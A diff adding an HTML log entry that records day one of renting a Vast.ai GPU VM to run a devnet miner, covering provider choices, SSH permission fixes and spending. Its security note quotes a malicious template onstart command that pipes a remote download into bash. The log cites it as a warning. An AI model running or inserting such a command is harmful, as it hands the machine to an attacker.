@@ -1,0 +1,42 @@
+<div class="entry">
+  <time>10-Nov-2026 · day 1</time>
+  <h3>Day 1 — provider hunt, first VM, and a detour through a broken marketplace</h3>
+  <p>Objective: one minimal FLOP SOFT miner on rented hardware, cheapest reliable
+  NVIDIA GPU with ≥16&nbsp;GB VRAM, full VM, Docker + NVIDIA Container Toolkit.</p>
+  <ul>
+    <li><b>Pack verified.</b> Official release pack
+    <code>miner-pack-devnet-ts-20261106</code> downloaded and sha256-verified
+    against the hash in the docs (<code>35f222f7…</code>). Devnet sponsor faucet
+    is open but miner sponsorships currently read <code>positions_full</code>
+    (256/256 signers) — expect bounded retries later.</li>
+    <li><b>Provider research.</b> Cheapest offers on the FLOP GPU market monitor
+    (Clore $0.072/hr, Salad $0.090/hr, Nosana) are container-only — nested Docker
+    is explicitly not permitted there. TensorDock A4000 (~$0.11/hr) was the
+    pick… until signup turned out to be disabled post-Lightning-merger
+    (reCAPTCHA site-key broken on the console, then "sign ups are temporarily
+    disabled").</li>
+    <li><b>Pivot to Vast.ai.</b> Only marketplace offering true KVM VMs.
+    Security note found along the way: Vast templates are user-generated and at
+    least one fake "Ubuntu 22.04 VM" template carries a malicious onstart
+    (<code>curl http://OOB/poison | bash</code>). Instances here are launched
+    from explicit pinned images / the official template only, never third-party
+    templates.</li>
+    <li><b>Instance 1 (60080161, discarded).</b> Rented RTX 4060&nbsp;Ti 16&nbsp;GB,
+    Quebec, $0.20/hr. KVM image's SSH key injection wrote
+    <code>authorized_keys</code> with bad ownership — sshd refused it
+    ("bad ownership or modes"). Destroyed after ~40&nbsp;min (~$0.12).</li>
+    <li><b>Instance 2 (60082655).</b> Same offer, recreated with an onstart script
+    repairing key permissions — SSH worked. But it turned out to be Vast's
+    container wrapper, not a real KVM guest: no systemd, no CAP_NET_ADMIN,
+    dockerd can't create bridge/iptables. Kept running for now as a fallback.</li>
+    <li><b>Instance 3 (60083693, in progress).</b> Same host, launched via the
+    <i>official</i> Vast "Ubuntu 22.04 VM" template
+    (<code>b7942f6b…</code>, creator 62897) which is what actually triggers the
+    KVM path — and whose own filter demands <code>compute_cap ≤ 900</code>
+    (excludes RTX 50xx hosts). Loading as of this entry.</li>
+  </ul>
+  <p><b>Spend so far:</b> ≈ $0.15 on vast.ai. Budget ceiling: $50.
+  <b>DNS:</b> ops site <code>agentchainlab.com</code>; miner session endpoint
+  will be <code>flop-miner.agentchainlab.com</code> fronted by this droplet via
+  reverse tunnel (Vast VMs have no guaranteed inbound 80/443).</p>
+</div>
